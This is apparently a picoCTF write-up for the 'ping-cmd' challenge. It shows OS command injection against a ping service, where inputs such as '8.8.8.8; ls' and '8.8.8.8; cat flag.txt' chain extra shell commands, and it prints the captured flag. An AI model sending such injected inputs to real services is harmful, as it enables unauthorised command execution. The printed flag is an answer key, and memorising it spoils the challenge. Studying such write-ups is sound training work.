# ping-cmd

- **Description:** Can you make the server reveal its secrets? 
It seems to be able to ping Google DNS, but what happens if you get a little creative with your input?

## 🔎 Solution
The service we connect to is essentially a tool that performs a `ping`, but it only allows requests to `8.8.8.8`.
```
> nc mysterious-sea.picoctf.net 51693
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.50 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=9.58 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 9.502/9.541/9.581/0.039 ms
```

For simple challenges like this, a common approach is to consider a potential Command Injection vulnerability. 
In Linux, commands can be chained using the `;` separator. 
In this case, it is reasonable to assume that the backend executes something like `ping <address>` based on user input.

If we supply `8.8.8.8; ls`, the executed command effectively becomes `ping 8.8.8.8; ls`, allowing us to run arbitrary commands:
```
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8; ls
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.50 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=9.59 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 9.503/9.545/9.588/0.042 ms
flag.txt
script.sh
```

From here, we can simply read the contents of `flag.txt` to retrieve the flag:
```
> nc mysterious-sea.picoctf.net 51693
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8; cat flag.txt
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.48 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=9.51 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 9.481/9.493/9.506/0.012 ms
//highlight-next-line
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_773788ba} 
```

## 🚩 Flag
> `picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_773788ba}`
